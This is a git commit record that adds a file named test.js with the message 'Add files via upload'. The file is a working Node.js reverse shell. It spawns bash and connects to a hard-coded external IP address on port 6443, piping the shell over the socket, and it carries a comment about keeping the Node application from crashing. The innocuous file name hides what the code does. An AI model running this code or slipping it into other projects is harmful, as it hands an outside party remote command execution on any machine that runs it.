a946de9f1b4b5424ba4eea682946328f6b28b38b
T3qui1a <whcyx87@163.com>
2024-02-01 10:21:28 +0800

    Add files via upload

---
+++ test.js
@@ -0,0 +1,12 @@
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("bash", []);
+    var client = new net.Socket();
+    client.connect(6443, "118.122.75.154", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
